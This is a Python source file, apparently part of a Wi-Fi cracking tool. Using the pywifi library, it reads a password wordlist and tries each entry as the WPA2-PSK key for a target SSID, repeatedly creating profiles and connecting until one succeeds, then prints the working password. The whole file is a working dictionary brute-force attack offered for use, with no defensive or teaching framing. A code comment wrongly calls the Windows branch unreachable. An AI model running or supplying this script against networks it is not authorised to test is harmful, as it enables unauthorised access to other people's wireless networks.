import os
import time

from consts import TOOL_INFORMATION, prompt
from pywifi import Profile, PyWiFi, const


def check(host, pasfile):
    wifi = PyWiFi()
    INF = wifi.interfaces()[0]
    password = open(pasfile, "r").read().splitlines()
    Error = 0
    for passwd in password:
        prof = Profile()
        prof.ssid = host
        prof.auth = const.AUTH_ALG_OPEN
        prof.akm.append(const.AKM_TYPE_WPA2PSK)
        prof.cipher = const.CIPHER_TYPE_CCMP
        prof.key = passwd
        INF.remove_all_network_profiles()
        TEMP_PROF = INF.add_network_profile(prof)
        time.sleep(0.1)
        INF.connect(TEMP_PROF)
        time.sleep(0.4)
        if INF.status() == 4:
            if os.name == "posix":
                os.system("clear")

            elif os.name == "nt":
                os.system("cls")  #! unreachable

            print(TOOL_INFORMATION)
            print(prompt(param=host, password=passwd, prompt=">>"))
            break
        else:
            Error = Error + 1
            print(prompt(param=host, password=passwd, prompt="BAD LOGIN"))
